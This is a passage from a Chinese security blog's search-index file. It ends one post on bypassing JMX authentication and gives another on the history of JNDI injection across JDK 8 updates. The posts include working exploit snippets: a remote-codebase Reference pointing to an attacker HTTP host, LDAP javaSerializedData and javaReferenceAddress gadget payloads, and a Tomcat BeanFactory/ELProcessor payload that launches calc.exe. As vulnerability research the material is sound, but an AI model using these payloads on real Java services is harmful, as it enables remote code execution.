class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.security</span>.MBeanServerAccessController<span class="hljs-selector-id">#createMBean</span>   当加上鉴权后在这里发生了变化<br>...<br></code></pre></td></tr></table></figure><p>翻了下源码统计下jmx配置文件中的权限可对应调用MBean的哪些操作。这些操作可以辅助我们对JMX服务进行进一步的测试：</p><p>read权限可执行的操作</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">getAttribute、getAttributes、getDefaultDomain、getDomains、getMBeanCount、getMBeanInfo、getObjectInstance、isInstanceOf、isRegistered、<span class="hljs-keyword">query</span>MBeans、<span class="hljs-keyword">query</span>Names、addNotificationListener、removeNotificationListener<br></code></pre></td></tr></table></figure><p>Write权限可执行的操作</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span>Attribute、<span class="hljs-keyword">set</span>Attributes<br></code></pre></td></tr></table></figure><p>Unregister权限可执行的操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unregisterMBean</span><br></code></pre></td></tr></table></figure><p>write权限、非MLet#addURL&#x2F;getMBeansFromURL方法可执行的操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">invoke</span><br></code></pre></td></tr></table></figure><p>read权限可以执行查询操作，如列出全部MBean的信息</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/40.png"></p><p>我们以低权限账户guest登录后再次测试如上几种利用方式</p><h3 id="3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427"><a href="#3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427" class="headerlink" title="3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427"></a>3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427</h3><p>地址可控的JNDI注入利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p><p>RMI方式的利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p><p>CVE-2016-3427是在RMI层-还原自定义方法的参数时触发的，与是否鉴权无关，只与JDK版本有关</p><h3 id="3-2-影响JMX层MBean方法的利用方式"><a href="#3-2-影响JMX层MBean方法的利用方式" class="headerlink" title="3.2 影响JMX层MBean方法的利用方式"></a>3.2 影响JMX层MBean方法的利用方式</h3><p>由于通过JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式是在javax.management.remote.rmi.RMIConnectionImpl#invoke 还原参数时触发的漏洞，并未执行到判断权限的位置。所以使用只读权限的guest账户即可继续进行利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/41.png"></p><h3 id="3-3-影响MLET加载Evil-MBean利用方式"><a href="#3-3-影响MLET加载Evil-MBean利用方式" class="headerlink" title="3.3 影响MLET加载Evil MBean利用方式"></a>3.3 影响MLET加载Evil MBean利用方式</h3><p>当未授权情况下JMX服务下MLET方式利用的步骤</p><p>1、客户端调用<code>JMXConnectorFactory.connect</code>连接到JMX服务端</p><p>2、调用createMBean创建javax.management.loading.MLet MBean</p><p>3、invoke调用MLet#getMBeansFromURL操作从外部获取Evil MBean</p><p>4、invoke调用Evil MBean的runCommand操作执行命令</p><p>当以低权限账户登录后，在第2步com.sun.jmx.remote.security.MBeanServerAccessController#createMBean创建bean的起点使用<code>checkCreate(className)</code>检查权限，执行到com.sun.jmx.remote.security.MBeanServerFileAccessController#checkAccess代码逻辑：1、获取当前登录用户的权限；2、判断权限是否包括create权限；3、如果无create权限或未登录用户则报错：<code>Access denied! Invalid access level for requested MBeanServer operation</code></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/42.png"></p><p>而我们登录使用的guest用户只有read权限，没法执行createBean操作，所以在执行EXP的客户端报错：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/43.png"></p><p>另外如果登录用户有create权限还是不能invoke调用MLet#getMBeansFromURL操作的，因为在invoke前会检查write、MLetMethods权限，write权限与上面判断read权限的流程一致，而MLetMethods权限是在com.sun.jmx.remote.security.MBeanServerAccessController#checkMLetMethods中判断的，如果调用javax.management.loading.MLet的addURL&#x2F;getMBeansFromURL都会报错退出</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/44.png"></p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273</a></p><p><a href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/">https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/</a></p><p><a href="https://www.cnblogs.com/afanti/p/12468693.html">https://www.cnblogs.com/afanti/p/12468693.html</a></p><p><a href="https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl">https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl</a></p><p><a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/">https://pwnull.github.io/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JMX</tag>
      
      <tag>JavaSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当我们谈论JNDI注入时，我们在谈论什么</title>
    <link href="/2022/jndi-injection-history/"/>
    <url>/2022/jndi-injection-history/</url>
    
    <content type="html"><![CDATA[<p>JNDI注入的利用根据JDK更新历史可以分为两个阶段，第一阶段是在JDK8u191之前，攻击者可以利用自搭建的RMI&#x2F;LDAP恶意服务器，让客户端去获取并加载我们放置的恶意类，该阶段的利用手法不受classpath是否拥有Gadget的限制。第二阶段是在JDK8u191之后，JDK增加了trustURLCodebase配置导致这种加载恶意类的方式失效，进而找出了 javaSerializedData、javaReferenceAddress放置Gadget、ObjectFactory#getObjectInstance触发敏感方法的方式，这种方式虽然不受JDK版本的限制，但是受限于目标的classpath是否拥有可利用的Gadget。而寻找通用性更强、使用范围更广的Gadget链还值得深入研究。</p><p>JNDI注入实际上就是控制lookup()的参数，使客户端去访问恶意的RMI&#x2F;LDAP服务去加载恶意对象，从而完成代码执行漏洞利用。按照利用手法可以分为：Reference#codebase的利用、本地ClassPath的Gadget利用、本地ClassPath的ObjectFactory+Gadget的利用。</p><p>环境相关：</p><p>本次测试使用版本：JDK8u112、JDK8u121、JDK8u144、JDK8u191、JDK8u341</p><p>JDK版本下载：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><h2 id="1、JNDI-with-RMI"><a href="#1、JNDI-with-RMI" class="headerlink" title="1、JNDI with RMI"></a>1、JNDI with RMI</h2><h3 id="1-1-RMI-Reference-codebase-的远程利用"><a href="#1-1-RMI-Reference-codebase-的远程利用" class="headerlink" title="1.1 RMI Reference#codebase 的远程利用"></a>1.1 RMI Reference#codebase 的远程利用</h3><p>在使用lookup查找获取远程服务器上绑定的对象时，若指定的远程地址为rmi，则会进入com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)流程，如果拿到的是Reference对象，那么会进入到加载Factory的代码逻辑，调用栈及原理如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#decodeObject</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager<span class="hljs-selector-id">#getObjectInstance</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager#getObjectFactoryFromReference<br></code></pre></td></tr></table></figure><p>如果在本地classpath中找不到我们指定的factory类（1），那么就会去远程codebase（2）去下载class字节码（3）回来并实例化（4）。 图为JDK8u112的代码</p><p><img src="/img/JNDI-injection-history/1.png"></p><p>若JDK8u112版本中，我们指定codebase为http地址，放置我们构造的恶意类，lookup发起请求即可执行Evil类静态代码块中的代码</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">Reference</span> <span class="hljs-keyword">reference</span> = new <span class="hljs-keyword">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://192.168.232.145:8888/&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/2.png"></p><p>修复：com.sun.jndi.rmi.registry.RegistryContext#decodeObject在JDK 8u121时增加了trustURLCodebase&#x3D;false的配置，这样就造成：如果想通过下图标签1的判断而不报错退出，只能让codebase(var8.getFactoryClassLocation())为空，这样factory只能为本地类，无法去外部加载恶意类了</p><p><img src="/img/JNDI-injection-history/3.png"></p><h2 id="2、Tomcat-BeanFactory-getObjectInstance的本地利用"><a href="#2、Tomcat-BeanFactory-getObjectInstance的本地利用" class="headerlink" title="2、Tomcat BeanFactory#getObjectInstance的本地利用"></a>2、Tomcat BeanFactory#getObjectInstance的本地利用</h2><p>我们看下如何去绕过修复补丁，在恶意服务器创建Reference对象时，可以指定classFactoryLocation为空，这样就会过掉上图标签1的判断</p><p><img src="/img/JNDI-injection-history/4.png"></p><p><img src="/img/JNDI-injection-history/5.png"></p><p>接着继续调用到javax.naming.spi.NamingManager#getObjectInstance，在该方法中完成三步：classFactory类名获取（1）、classFactory的实例化（2）、调用getObjectInstance方法（3）。在上一章节触发代码执行的是2中classFactory的实例化，现在由于补丁的限制导致classFactoryLocation为空，所以classFactory只能指定为本地ClassPath中存在的类，系统在实例化后会调用classFactory#getObjectInstance方法，即下图的标签3</p><p><img src="/img/JNDI-injection-history/6.png"></p><p>那么现在想要继续完成漏洞利用，需要在本地ClassPath中找到一个类，其实现了javax.naming.spi.ObjectFactory接口、且静态代码块&#x2F;getObjectInstance方法存在敏感操作。 Veracode找到了Tomcat中的org.apache.naming.factory.BeanFactory，Tomcat的使用相当广泛，所以这个链的实战价值还是很高的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>pom.xml添加引入Tomcat后，我们分析下这条链：org.apache.naming.factory.BeanFactory#getObjectInstance方法中会对传入的className进行实例化、使用JDK的内省机制java.beans.Introspector#getBeanInfo  获取属性（存在getter&#x2F;setter方法的属性才会被识别），但同时该方法也提供了”别名机制“：基于传入的forceString字符串，根据&#x3D;分割拿到要执行的”setter别名方法”及String类型的参数值，最后调用反射执行。这样Gadget的source点就从”ObjectFactory接口实现类的getObjectInstance方法”变成了”本地任意类包含String类型参数的方法”</p><p><img src="/img/JNDI-injection-history/7.png"></p><p><img src="/img/JNDI-injection-history/8.png"></p><p>而Tomcat8自带的javax.el.ELProcessor#eval(String)满足该条件，可执行传入的java代码进行利用。</p><p><img src="/img/JNDI-injection-history/9.png"></p><p>构造格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;evil code&quot;</span>));<br></code></pre></td></tr></table></figure><p>分割得到eval方法、String参数，添加至forced map中</p><p><img src="/img/JNDI-injection-history/10.png"></p><p>最终从forced拿出方法，利用反射执行javax.el.ELProcessor#eval(“evil code”)</p><p><img src="/img/JNDI-injection-history/11.png"></p><p>至此，绕过了JDK8u121的修复</p><h2 id="3、JNDI-with-Ldap"><a href="#3、JNDI-with-Ldap" class="headerlink" title="3、JNDI with Ldap"></a>3、JNDI with Ldap</h2><h3 id="3-1、Ldap-javaSerializedData的本地利用"><a href="#3-1、Ldap-javaSerializedData的本地利用" class="headerlink" title="3.1、Ldap javaSerializedData的本地利用"></a>3.1、Ldap javaSerializedData的本地利用</h3><p>上面讲到了利用恶意RMI服务器进行漏洞利用，在JDK中还有ldap可以使用。当lookup请求地址的协议为ldap时，会走到com.sun.jndi.ldap.LdapCtx#c_lookup进行处理解析。从整体的代码结构看，涉及EXP构造的代码部分有4处：1获取ldap请求的结果、2解析结果拿到attribute属性值、3根据attribute的属性组装Reference类、4加载远程的恶意class并实例化造成代码执行。其中第4步与上章节中的JNDI_RMI解析调用流程一致，但是JDK8u121是在RegistryContext#decodeObject层做的trustURLCodebase修复限制，与ldap使用codebase加载factory类的流程无关联。所以JNDI_RMI的修复方案并不影响JNDI_LDAP的利用</p><p><img src="/img/JNDI-injection-history/12.png"></p><p>如果存在javaClassName属性，则进入到com.sun.jndi.ldap.Obj#decodeObject组装Reference的流程。代码比较清晰，也是EXP构造比较重要的一步，逐个分析下：标签1 如果存在javaSerializedData属性值，进入deserializeObject反序列化操作。从属性名字能看出来是java的序列化数据，且在反序列化过程中未做过滤。所以我们可以把恶意对象绑定在javaSerializedData属性上，这是JNDI-LDAP的第一个利用点</p><p><img src="/img/JNDI-injection-history/13.png"></p><p>com.sun.jndi.ldap.Obj#deserializeObject</p><p><img src="/img/JNDI-injection-history/14.png"></p><h3 id="3-2、Ldap-javaReferenceAddress的本地利用"><a href="#3-2、Ldap-javaReferenceAddress的本地利用" class="headerlink" title="3.2、Ldap javaReferenceAddress的本地利用"></a>3.2、Ldap javaReferenceAddress的本地利用</h3><p>接着回到decodeObject往下走：标签2 如果存在javaRemoteLocation属性值，就进入decodeRmiObject操作：根据javaClassName、javaRemoteLocation、javaCodeBase等属性值组装Reference对象并返回</p><p><img src="/img/JNDI-injection-history/15.png"></p><p>接着回到decodeObject往下走：进入标签3 如果存在objectClass属性且其包括javaNamingReference，则进入com.sun.jndi.ldap.Obj#decodeReference组装Reference的操作</p><p><img src="/img/JNDI-injection-history/16.png"></p><p>当存在javaClassName属性时，最终返回对象<code>Reference(javaClassName, javaFactory, javacodebase[0])</code>。如果存在javaReferenceAddress值，进入组装RefAddr对象的流程，可以看到如果构造的数据满足条件，与javaSerializedData属性的解析过程一样，进入deserializeObject反序列化流程，这是JNDI-LDAP的第二个利用点</p><p><img src="/img/JNDI-injection-history/17.png"></p><h3 id="3-3、Ldap-Reference-codebase的远程利用"><a href="#3-3、Ldap-Reference-codebase的远程利用" class="headerlink" title="3.3、Ldap Reference#codebase的远程利用"></a>3.3、Ldap Reference#codebase的远程利用</h3><p>拿到了Reference对象，接着回到com.sun.jndi.ldap.LdapCtx#c_lookup的解析流程，执行第4步的getObjectInstance方法，该方法与JNDI_RMI解析过程的javax.naming.spi.NamingManager#getObjectInstance一致，都是获取codebase加载远程factory类并实例化。这是JNDI-LDAP的第三个利用点</p><p><img src="/img/JNDI-injection-history/18.png"></p><p>修复：com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)加载外部factory时，在JDK 8u191时增加了com.sun.jndi.ldap.object.trustURLCodebase&#x3D;false的配置，造成loadClass()直接返回null，无法通过codebase去加载构造的外部恶意类。但是上面提到的第一种javaSerializedData、第二种RefAddr方式仍然可以使用</p><p><img src="/img/JNDI-injection-history/19.png"></p><p><img src="/img/JNDI-injection-history/20.png"></p><p>基本的解析流程都分析完了，本地测试时可以起个ldap服务构造EXP，搭建ldap服务可使用ldapsdk包。可以maven加载也可以单独引入：<a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ldap服务代码可参考<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p><h2 id="4、版本相关问题"><a href="#4、版本相关问题" class="headerlink" title="4、版本相关问题"></a>4、版本相关问题</h2><p>JDK8系列最新版本(8u341)测试，未对JNDI_LDAP的第一种javaSerializedData、第二种javaReferenceAddress、Tomcat BeanFactory#getObjectInstance的利用方式进行限制。如果目标ClassPath存在Gadget，还是可以继续利用的。我们分别来看下：</p><p>1、JNDI_LDAP的第一种javaSerializedData利用方式，只需要把恶意类设置为javaSerializedData的属性值即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//恶意服务端设置两个属性javaClassName、javaSerializedData</span><br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Serializer.<span class="hljs-params">serialize</span>(<span class="hljs-params">new</span> CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/21.png"></p><p>2、JNDI_LDAP的第二种javaReferenceAddress利用方式，对于RefAddr对象的数据构造可参考com.sun.jndi.ldap.Obj#decodeReference</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1</span>、将javaReferenceAddress属性值的首字符做为分割符，我这里使用!符号<br><span class="hljs-number">2</span>、第一跟第二个分隔符中为RefAddr position，<span class="hljs-type">int</span>类型数据，使用<span class="hljs-number">1</span><br><span class="hljs-number">3</span>、第二跟第三个分隔符中为RefAddr type，<span class="hljs-type">String</span>类型数据，使用a<br><span class="hljs-number">4</span>、第三个与第四个分隔符在一起，后面是经过base64编码的序列化数据，使用cb链演示<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/22.png"></p><p>恶意服务端设置三个属性objectClass、javaClassName、javaReferenceAddress</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaReferenceAddress&quot;</span>,<span class="hljs-string">&quot;!1!a!!&quot;</span>+<span class="hljs-params">new</span> BASE64Encoder()</span>.encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Serializer</span>.</span></span>serialize(<span class="hljs-keyword">new</span> <span class="hljs-constructor">CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>)));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/23.png"></p><p>成功在JDK8系列最新版本完成利用</p><p>3、Tomcat BeanFactory#getObjectInstance的本地利用方式，可以看到在JDK8系列的最新版本8u341利用成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ResourceRef resourceRef = <span class="hljs-built_in">new</span> ResourceRef(&quot;javax.el.ELProcessor&quot;,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>,&quot;org.apache.naming.factory.BeanFactory&quot;,<span class="hljs-keyword">null</span>);<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;x&quot;,&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;<span class="hljs-built_in">new</span> java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;calc.exe&#x27;</span>]).<span class="hljs-keyword">start</span>()\&quot;)&quot;));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/24.png"></p><h2 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h2><p><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p><a href="https://evilpan.com/2021/12/13/jndi-injection/">https://evilpan.com/2021/12/13/jndi-injection/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>JNDI</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
